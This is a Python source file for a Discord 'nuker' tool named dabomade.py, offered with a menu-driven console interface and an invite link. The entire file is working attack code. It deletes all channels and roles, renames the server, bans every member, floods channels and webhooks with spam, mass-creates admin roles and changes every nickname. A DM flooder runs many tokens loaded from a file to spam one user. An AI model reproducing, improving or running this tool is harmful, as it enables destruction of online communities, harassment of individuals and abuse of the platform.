import discord
from discord.ext import commands
import asyncio
import os
import ctypes
import struct
import requests
from datetime import datetime
from pystyle import Colorate, Colors

# Token and intents
TOKEN = "bot token here"
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_ID = "server id here"

# Clear console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_console_size():
    h = ctypes.windll.kernel32.GetStdHandle(-12)
    csbi = ctypes.create_string_buffer(22)
    res = ctypes.windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
    (bufx, bufy, curx, cury, wattr, left, top, right, bottom, maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
    new_width = int((right - left + 1) * 1.0)
    new_height = int((bottom - top + 1) * 1.0)
    os.system(f'mode con: cols={new_width} lines={new_height}')

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

set_console_size()
set_console_title("dabomade.py")

class MyClient(discord.Client):
    def __init__(self, token, user_id, message_content, message_count, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.user_id = user_id
        self.message_content = message_content
        self.message_count = message_count

    async def on_ready(self):
        timestamp = datetime.now().strftime("%H:%M:%S")
        user = await self.fetch_user(self.user_id)

        for i in range(self.message_count):
            message = await user.send(content=self.message_content)
            print(f"[\033[92m+\033[0m] {timestamp} - sent message {i+1}/{self.message_count} to \033[92m{user.name}\033[0m")
            await asyncio.sleep(0.1)

        await self.close()

    async def on_connect(self):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f'[\033[92m+\033[0m] {timestamp} - {self.user} is online')

async def start_client(token, user_id, message_content, message_count):
    intents = discord.Intents.default()
    intents.messages = True
    client = MyClient(token, user_id, message_content, message_count, intents=intents)

    try:
        await client.start(token)
    except discord.errors.LoginFailure:
        print(Colorate.Vertical(Colors.gray_to_gray, f"Improper token has been passed: {token[:20]}"))
    except Exception as e:
        print(Colorate.Vertical(Colors.gray_to_gray, f"Error for token {token[:20]}: {e}"))

async def run_bots(tokens, user_id, message_content, message_count):
    tasks = [start_client(token, user_id, message_content, message_count) for token in tokens]
    await asyncio.gather(*tasks)


ascii_page1 = """ 
              ██████╗  █████╗ ██████╗  ██████╗ 
              ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
              ██║  ██║███████║██████╔╝██║   ██║
              ██║  ██║██╔══██║██╔══██╗██║   ██║
              ██████╔╝██║  ██║██████╔╝╚██████╔╝
              ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝
  
            ═══════════════════════════════════

                https://discord.gg/bgP2C7Px42



      [01] create channels            [04] mass ban                  
      [02] delete channels            [05] spam channels 
      [03] rename server              [06] nuke server   

                        Next Page >
"""

ascii_page2 = """ 
              ██████╗  █████╗ ██████╗  ██████╗ 
              ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
              ██║  ██║███████║██████╔╝██║   ██║
              ██║  ██║██╔══██║██╔══██╗██║   ██║
              ██████╔╝██║  ██║██████╔╝╚██████╔╝
              ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝
  
            ═══════════════════════════════════

                https://discord.gg/bgP2C7Px42



      [07] create roles               [10] dm flooder                  
      [08] delete roles               [11] webhook info                
      [09] nickname spam              [12] webhook rename                            

               < Previous Page | Next Page > 
"""

ascii_page3 = """ 
              ██████╗  █████╗ ██████╗  ██████╗ 
              ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
              ██║  ██║███████║██████╔╝██║   ██║
              ██║  ██║██╔══██║██╔══██╗██║   ██║
              ██████╔╝██║  ██║██████╔╝╚██████╔╝
              ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝
  
            ═══════════════════════════════════

                https://discord.gg/bgP2C7Px42



      [13] delete webhook                            
      [14] webhook spam                             

                      < Previous Page
"""


@bot.event
async def on_ready():
    guild = bot.get_guild(int(SERVER_ID))
    if not guild:
        print("Bot is not in the server.")
        await bot.close()
        return

    current_page = 1

    while True:
        clear_console()
        if current_page == 1:
            print(Colorate.Horizontal(Colors.green_to_white, ascii_page1))
        elif current_page == 2:
            print(Colorate.Horizontal(Colors.green_to_white, ascii_page2))
        elif current_page == 3:
            print(Colorate.Horizontal(Colors.green_to_white, ascii_page3))

        actions = await asyncio.to_thread(input, "\n[\033[92m>\033[0m] ")
        actions = actions.strip().split()

        if actions == ['>']:
            if current_page == 1:
                current_page = 2
            elif current_page == 2:
                current_page = 3
            continue

        if actions == ['<']:
            if current_page == 3:
                current_page = 2
            elif current_page == 2:
                current_page = 1
            continue

        if '0' in actions:
            print("[\033[91m-\033[0m] Exiting...")
            await bot.close()
            break

        if current_page == 1:
            if '6' in actions:
                channel_name = await asyncio.to_thread(input, "[\033[92m>\033[0m] channel name: ")
                try:
                    amount = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] channel amount: "))
                except ValueError:
                    print("[\033[91m!\033[0m] Invalid number entered. Defaulting to 5 channels.")
                    amount = 5

                message = await asyncio.to_thread(input, "[\033[92m>\033[0m] message: ")
                try:
                    msg_amount = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] message amount per channel: "))
                except ValueError:
                    print("[\033[91m!\033[0m] Invalid number entered. Defaulting to 5 messages.")
                    msg_amount = 5

                await mass_delete_channels(guild)
                await change_server_name(guild)
                await mass_create_channels(guild, channel_name, amount)
                await spam_messages(guild, message, msg_amount)
                await mass_ban_members(guild)

            if '2' in actions:
                await mass_delete_channels(guild)
            if '3' in actions:
                await change_server_name(guild)
            if '1' in actions:
                channel_name = await asyncio.to_thread(input, "[\033[92m>\033[0m] channel name: ")
                try:
                    amount = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] channel amount: "))
                except ValueError:
                    print("[\033[91m!\033[0m] Invalid number entered. Defaulting to 5 channels.")
                    amount = 5
                await mass_create_channels(guild, channel_name, amount)
            if '5' in actions:
                message = await asyncio.to_thread(input, "[\033[92m>\033[0m] message: ")
                try:
                    msg_amount = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] message amount per channel: "))
                except ValueError:
                    print("[\033[91m!\033[0m] Invalid number entered. Defaulting to 5 messages.")
                    msg_amount = 5
                await spam_messages(guild, message, msg_amount)
            if '4' in actions:
                await mass_ban_members(guild)

        if current_page == 2:
            if '7' in actions:
                role_name = await asyncio.to_thread(input, "[\033[92m>\033[0m] role name: ")
                try:
                    amount = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] role amount: "))
                except ValueError:
                    print("[\033[91m!\033[0m] Invalid number entered. Defaulting to 1 role.")
                    amount = 1
                admin_permission_input = await asyncio.to_thread(input, "[\033[92m>\033[0m] Grant admin permissions? (yes/no): ")
                admin_permission = admin_permission_input.lower() == "yes"
                await mass_create_roles(guild, role_name, amount, admin_permission)
            if '8' in actions:
                await mass_delete_roles(guild)

            if '9' in actions:
                nickname = await asyncio.to_thread(input, "[\033[92m>\033[0m] nickname to set: ")
                await mass_change_nicknames(guild, nickname)  # Correct function name here

            if '10' in actions:
                try:
                    user_id = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] user ID: "))
                    message_content = await asyncio.to_thread(input, "[\033[92m>\033[0m] Enter the message to send: ")
                    message_count = int(await asyncio.to_thread(input, "[\033[92m>\033[0m] Number of messages to send: "))
                    tokens_path = await asyncio.to_thread(input, "[\033[92m>\033[0m] Drag & drop tokens.txt here: ")
                except Exception as e:
                    print(f"[\033[91m!\033[0m] Input error: {e}")
                    return

                try:
                    with open(tokens_path.strip('"'), 'r') as file:
                        tokens = [line.strip() for line in file if line.strip()]
                    await run_bots(tokens, user_id, message_content, message_count)
                except Exception as e:
                    print(f"[\033[91m!\033[0m] Failed to load tokens or start bots: {e}")

            if '11' in actions:
                    webhook_url = input("[\033[92m>\033[0m] Enter the webhook URL: ")
                    await lookup_webhook(webhook_url)

            if '12' in actions:
                    webhook_url = input("[\033[92m>\033[0m] Enter the webhook URL: ")
                    new_name = input("[\033[92m>\033[0m] Enter the new name for the webhook: ")
                    await rename_webhook(webhook_url, new_name)

        if current_page == 3:
            if '13' in actions:
                    webhook_url = input("[\033[92m>\033[0m] Enter the webhook URL: ")
                    await delete_webhook(webhook_url)

            if '14' in actions:
                    webhook_url = input("[\033[92m>\033[0m] Enter the webhook URL: ")
                    message_content = input("[\033[92m>\033[0m] Enter the message to send: ")
                    message_count = int(input("[\033[92m>\033[0m] Number of messages to send: "))
                    await send_webhook_message(webhook_url, message_content, message_count)



        await asyncio.sleep(1)
        clear_console()


async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"[\033[92m+\033[0m] deleted {channel.id}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] Failed to delete {channel.id}: {e}")

async def mass_delete_channels(guild):    
    for channel in guild.channels:
        await delete_channel(channel)
        await asyncio.sleep(0.01)

async def create_channel(guild, channel_name):
    try:
        channel = await guild.create_text_channel(channel_name)
        print(f"[\033[92m+\033[0m] created {channel.id}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] Failed to create channel: {e}")

async def mass_create_channels(guild, channel_name, amount):
    batch_size = 50
    for i in range(0, amount, batch_size):
        tasks = []
        for j in range(batch_size):
            if i + j < amount:
                dynamic_name = f"{channel_name}"
                tasks.append(create_channel(guild, dynamic_name))

        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)

async def change_server_name(guild):
    new_server_name = await asyncio.to_thread(input, "[\033[92m>\033[0m] new server name: ")

    try:
        await guild.edit(name=new_server_name)
        print(f"[\033[92m+\033[0m] renamed server to {new_server_name}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] failed to rename server")

# Create a single role
async def create_role(guild, role_name, admin_permission):
    try:
        permissions = discord.Permissions()
        if admin_permission:
            permissions.administrator = True  # Grant admin permissions if selected

        # Create the role with the given name and permissions
        role = await guild.create_role(name=role_name, permissions=permissions)
        print(f"[\033[92m+\033[0m] created role: {role.name}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] Failed to create role: {e}")

# Mass create roles
async def mass_create_roles(guild, role_name, amount, admin_permission):
    batch_size = 50  # Create roles in batches to avoid rate limit issues

    for i in range(0, amount, batch_size):
        tasks = []
        for j in range(batch_size):
            if i + j < amount:
                dynamic_name = f"{role_name}"  # Create unique role names
                tasks.append(create_role(guild, dynamic_name, admin_permission))

        # Run all role creation tasks in parallel
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)  # Delay between batches to avoid rate limits

async def delete_role(role):
    try:
        await role.delete()
        print(f"[\033[92m+\033[0m] deleted role: {role.name}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] Failed to delete role {role.name}: {e}")

async def mass_delete_roles(guild):
    print("[\033[92m!\033[0m] deleting roles")
    for role in guild.roles:
        if role.is_default():  # Skip @everyone role
            continue
        try:
            await delete_role(role)
            await asyncio.sleep(0.2)  # Wait to avoid rate limits
        except Exception as e:
            print(f"[\033[91m!\033[0m] Error deleting role: {e}")

async def change_nickname(member, new_nick):
    try:
        await member.edit(nick=new_nick)
        print(f"[\033[92m+\033[0m] Changed {member.name}'s nickname to {new_nick}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] Could not change {member.name}'s nickname: {e}")

async def mass_change_nicknames(guild, new_nick, sleep_time=0.2):
    print(f"[\033[92m!\033[0m] Changing all nicknames to: {new_nick}")
    members = [member for member in guild.members]
    
    # Loop through each member and change their nickname
    for member in members:
        try:
            await change_nickname(member, new_nick)
            await asyncio.sleep(sleep_time)  # Wait for 0.2 seconds before changing the next nickname
        except Exception as e:
            print(f"[\033[91m!\033[0m] Error changing nickname for {member.name}: {e}")

async def ban_member(guild, member):
    try:
        await guild.ban(member, reason="Nuke")
        print(f"[\033[92m+\033[0m] banned: {member}")
    except Exception as e:
        print(f"[\033[91m!\033[0m] Failed to ban {member}: {e}")

async def mass_ban_members(guild):
    print("[\033[92m!\033[0m] mass banning")
    batch_size = 25  # adjust if needed
    members = guild.members  # includes bots now

    for i in range(0, len(members), batch_size):
        tasks = [ban_member(guild, member) for member in members[i:i + batch_size]]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)  # delay to reduce rate-limit risk

async def spam_messages(guild, message, amount):
    tasks = []
    for channel in guild.text_channels:
        tasks.append(spam_in_channel(channel, message, amount))
    await asyncio.gather(*tasks)

async def spam_in_channel(channel, msg, amount):
    try:
        for _ in range(amount):
            await channel.send(msg)
            print(f"[\033[92m+\033[0m] sent message in {channel.id}")
            await asyncio.sleep(1)
    except Exception as e:
        print(f"[\033[91m!\033[0m] Failed to send message in {channel.id}: {e}")

async def send_webhook_message(webhook_url, message_content, message_count):
    for i in range(message_count):
        payload = {
            "content": message_content
        }
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                print(f"[\033[92m+\033[0m] Sent message {i+1}/{message_count} to webhook.")
            else:
                print(f"[\033[91m-\033[0m] Failed to send message: {response.status_code}")
        except Exception as e:
            print(f"[\033[91m-\033[0m] Error sending message to webhook: {e}")
        await asyncio.sleep(0.1)  # Optional delay between messages

async def lookup_webhook(webhook_url):
    try:
        response = requests.get(webhook_url)
        if response.status_code == 200:
            webhook_info = response.json()
            print(f"[\033[92m+\033[0m] Webhook Info: {webhook_info}")
        else:
            print(f"[\033[91m-\033[0m] Failed to retrieve webhook info: {response.status_code}")
    except Exception as e:
        print(f"[\033[91m-\033[0m] Error retrieving webhook info: {e}")

async def rename_webhook(webhook_url, new_name):
    try:
        payload = {
            "name": new_name
        }
        response = requests.patch(webhook_url, json=payload)
        if response.status_code == 200:
            print(f"[\033[92m+\033[0m] Webhook renamed to: {new_name}")
        else:
            print(f"[\033[91m-\033[0m] Failed to rename webhook: {response.status_code}")
    except Exception as e:
        print(f"[\033[91m-\033[0m] Error renaming webhook: {e}")

async def delete_webhook(webhook_url):
    try:
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            print("[\033[92m+\033[0m] Webhook deleted successfully.")
        else:
            print(f"[\033[91m-\033[0m] Failed to delete webhook: {response.status_code}")
    except Exception as e:
        print(f"[\033[91m-\033[0m] Error deleting webhook: {e}")

# Start bot
bot.run(TOKEN)
